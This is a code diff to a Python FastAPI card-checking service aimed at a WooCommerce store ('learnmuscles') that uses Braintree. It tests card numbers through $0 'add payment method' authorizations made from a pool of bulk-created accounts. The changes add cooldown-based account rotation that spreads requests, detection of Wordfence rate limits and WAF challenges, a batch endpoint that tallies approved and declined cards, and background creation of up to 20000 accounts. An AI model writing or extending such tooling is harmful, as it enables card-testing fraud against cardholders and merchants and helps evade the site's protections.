@@ -31,11 +31,19 @@ except Exception:
     pass
 
 try:
-    from fastapi import FastAPI
+    from fastapi import FastAPI, Request, Response
     from fastapi.responses import JSONResponse
     app = FastAPI()
+    def pretty_json(data, status_code=200):
+        return Response(
+            content=json.dumps(data, indent=2, ensure_ascii=False),
+            media_type="application/json",
+            status_code=status_code
+        )
 except Exception:
     app = None
+    def pretty_json(data, status_code=200):
+        return data
 
 # ─── Configuration ───────────────────────────────────────────
 GATEWAY = "Braintree Auth"
@@ -91,6 +99,8 @@ _b_lock = threading.Lock()
 _stop = threading.Event()
 _auto_maintain_running = False
 _auto_maintain_lock = threading.Lock()
+_cookie_cooldowns = {}
+COOKIE_COOLDOWN_SECONDS = 20
 
 # ─── Utility Functions ────────────────────────────────────────
 
@@ -194,14 +204,27 @@ def save_pool(p):
         pass
 
 def get_cookie():
-    global _idx
     p = load_pool()
     if not p:
         return None
     with _lock:
-        e = p[_idx % len(p)]
-        _idx += 1
-    return e
+        now = time.time()
+        # Find all accounts whose 20s cooldown has expired
+        eligible = [
+            acc for acc in p
+            if now - _cookie_cooldowns.get(acc.get("email"), 0) >= COOKIE_COOLDOWN_SECONDS
+        ]
+        if eligible:
+            chosen = random.choice(eligible)
+        else:
+            # If all cookies are currently in 20s cooldown, pick the one waiting the longest
+            chosen = min(p, key=lambda acc: _cookie_cooldowns.get(acc.get("email"), 0))
+            wait = COOKIE_COOLDOWN_SECONDS - (now - _cookie_cooldowns.get(chosen.get("email"), 0))
+            if wait > 0:
+                time.sleep(wait)
+
+        _cookie_cooldowns[chosen.get("email")] = time.time()
+        return chosen
 
 def update_account_cookies(email, new_cookies):
     if not email:
@@ -219,6 +242,7 @@ def remove_cookie(em, proxy=None):
     with _lock:
         p = [e for e in load_pool() if e.get("email") != em]
         save_pool(p)
+        _cookie_cooldowns.pop(em, None)
     # Background refill 1 account
     t = threading.Thread(target=create_accounts_bg, args=(1, proxy), daemon=True)
     t.start()
@@ -687,6 +711,8 @@ def check_card(cc, mm, yy, cvv, proxy=None, retries=2):
         fresh = create_account(proxy=proxy)
         if fresh.get("status") == "success":
             entry = fresh
+            with _lock:
+                _cookie_cooldowns[fresh.get("email")] = time.time()
         else:
             return result("Try Again Later")
     else:
@@ -731,7 +757,14 @@ def check_card(cc, mm, yy, cvv, proxy=None, retries=2):
                 fresh = create_account(proxy=proxy)
                 if fresh.get("status") == "success":
                     return check_card(cc, mm, yy, cvv, proxy=proxy, retries=retries - 1)
-            return result("Try Again Later")
+            
+            if "limited by the site owner" in h.lower() or "503" in h:
+                return result("Wordfence Rate Limit (503)")
+            elif "checking your browser" in h.lower():
+                return result("WAF Challenge Unresolved")
+            elif "login" in h.lower() or "woocommerce-form-login" in h.lower():
+                return result("Session Expired")
+            return result("Gateway Nonce Missing")
 
         # 2. Fetch Braintree Client Token
         rt = s.post(
@@ -749,10 +782,14 @@ def check_card(cc, mm, yy, cvv, proxy=None, retries=2):
             timeout=30
         )
         try:
-            dec = json.loads(base64.b64decode(rt.json()["data"]).decode("utf-8", errors="ignore"))
+            res_json = rt.json()
+            if not res_json.get("success"):
+                err_data = str(res_json.get("data", ""))
+                return result(f"Braintree Token Error: {err_data}" if err_data else "Failed to fetch client token")
+            dec = json.loads(base64.b64decode(res_json["data"]).decode("utf-8", errors="ignore"))
             fp = dec["authorizationFingerprint"]
-        except Exception:
-            return result("Try Again Later")
+        except Exception as e:
+            return result(f"Client Token Error: {sanitize(str(e))}")
 
         # 3. Tokenize card via Braintree GraphQL
         yf = "20" + yy if len(yy) == 2 else yy
@@ -806,7 +843,12 @@ def check_card(cc, mm, yy, cvv, proxy=None, retries=2):
 
         ni = (td.get("data") or {}).get("tokenizeCreditCard")
         if not ni:
-            return result("Try Again Later")
+            gql_errors = td.get("errors") or []
+            if gql_errors and isinstance(gql_errors, list):
+                msgs = [e.get("message") for e in gql_errors if e.get("message")]
+                if msgs:
+                    return result(f"Braintree: {' | '.join(msgs)}")
+            return result("Card Tokenization Failed")
 
         # 4. Submit Add Payment Method ($0 Auth)
         dd = json.dumps({
@@ -903,11 +945,27 @@ def check_card(cc, mm, yy, cvv, proxy=None, retries=2):
             if retries > 0 and len(load_pool()) > 1:
                 return check_card(cc, mm, yy, cvv, proxy=proxy, retries=retries - 1)
 
-        # If there is no status code and not approved, return Try Again Later
-        return result("Try Again Later")
+        # Return real error if found!
+        if err_text:
+            return result(err_text)
 
-    except Exception:
-        return result("Try Again Later")
+        # Check if response text has any WooCommerce notice / error
+        m_notice = re.search(r'class="woocommerce-(?:error|message)[^"]*"[^>]*>(.*?)</', r.text, re.S)
+        if m_notice:
+            clean_n = sanitize(re.sub(r'<[^>]+>', ' ', m_notice.group(1)))
+            if clean_n:
+                return result(clean_n)
+
+        if r.status_code != 200:
+            return result(f"HTTP {r.status_code} Error")
+
+        return result("Card Declined")
+
+    except Exception as e:
+        err_str = sanitize(str(e))
+        if not err_str or "connection" in err_str.lower() or "timeout" in err_str.lower():
+            err_str = "Network / Proxy Timeout"
+        return result(f"Error: {err_str}")
 
 # ─── Card Parsing & Batch Workers (10 Threads) ────────────────
 
@@ -949,14 +1007,14 @@ def process_single(card, proxy=None):
 if app:
     @app.get("/")
     def root():
-        return {
+        return pretty_json({
             "status": "ok",
             "gateway": GATEWAY,
             "type": "auth($0)",
             "site": "learnmuscles",
             "pool": len(load_pool()),
             "credit": CREDIT
-        }
+        })
 
     @app.get("/b3")
     def b3(cc: str = None, acc: str = None, p: str = None):
@@ -966,7 +1024,7 @@ if app:
                 with _b_lock:
                     b, r, d, f = _building, _req, _done, _fail
                 pool = load_pool()
-                return {
+                return pretty_json({
                     "pool_size": len(pool),
                     "building": b,
                     "requested": r,
@@ -974,7 +1032,7 @@ if app:
                     "failed": f,
                     "accounts": [{"email": a.get("email", "?"), "user": a.get("user", "?"), "created": a.get("created_at", "?")} for a in pool],
                     "credit": CREDIT
-                }
+                })
 
             # Minimum 20 is compulsory, Maximum 20000
             try:
@@ -990,28 +1048,35 @@ if app:
                 n = raw_n
 
             threading.Thread(target=create_accounts_bg, args=(n, p), daemon=True).start()
-            return {
+            return pretty_json({
                 "status": "creating",
                 "count": n,
                 "current_pool": len(load_pool()),
                 "message": f"Building {n} accounts in background. /b3?acc=0 for status"
-            }
+            })
 
         if not cc:
-            return JSONResponse(status_code=400, content={"error": "Missing cc or acc"})
+            return pretty_json({"error": "Missing cc or acc"}, status_code=400)
         parts = re.split(r'[|:]', cc)
         if len(parts) >= 4:
-            return check_card(parts[0], parts[1], parts[2], parts[3], proxy=p)
-        return JSONResponse(status_code=400, content={"error": "Format: cc|mm|yy|cvv"})
+            return pretty_json(check_card(parts[0], parts[1], parts[2], parts[3], proxy=p))
+        return pretty_json({"error": "Format: cc|mm|yy|cvv"}, status_code=400)
 
-    @app.get("/batch")
-    def batch(cc: str = None, c: str = None, p: str = None):
+    @app.api_route("/batch", methods=["GET", "POST"])
+    async def batch(request: Request = None, cc: str = None, c: str = None, p: str = None):
         raw = cc or c
+        if not raw and request:
+            try:
+                body = await request.body()
+                if body:
+                    raw = body.decode("utf-8", errors="ignore")
+            except Exception:
+                pass
         if not raw:
-            return JSONResponse(status_code=400, content={"error": "Missing cc/c"})
+            return pretty_json({"error": "Missing cc or c parameter"}, status_code=400)
         cards = parse_cards(raw)
         if not cards:
-            return JSONResponse(status_code=400, content={"error": "No valid cards"})
+            return pretty_json({"error": "No valid cards found in format cc|mm|yy|cvv"}, status_code=400)
 
         t0 = time.time()
         results = []
@@ -1020,28 +1085,35 @@ if app:
             for f in as_completed(futs):
                 try:
                     results.append(f.result())
-                except Exception:
+                except Exception as e:
                     results.append({
                         "card": futs[f],
                         "gateway": GATEWAY,
-                        "response": "Try Again Later",
+                        "response": sanitize(str(e)) or "Request Failed",
                         "time": "0.0s",
                         "credit": CREDIT
                     })
 
-        return {
-            "results": results,
+        approved = sum(1 for r in results if "APPROVED" in r.get("response", "").upper())
+        declined = sum(1 for r in results if "APPROVED" not in r.get("response", "").upper())
+
+        return pretty_json({
+            "status": "ok",
+            "gateway": GATEWAY,
             "total_cards": len(results),
+            "approved": approved,
+            "declined": declined,
             "total_time": f"{time.time() - t0:.1f}s",
+            "results": results,
             "credit": CREDIT
-        }
+        })
 
     @app.get("/stop")
     def stop():
         _stop.set()
         with _b_lock:
             building = _building
-        return {"status": "stopped", "building": building}
+        return pretty_json({"status": "stopped", "building": building})
 
 # ─── Main / CLI Execution ─────────────────────────────────────
 
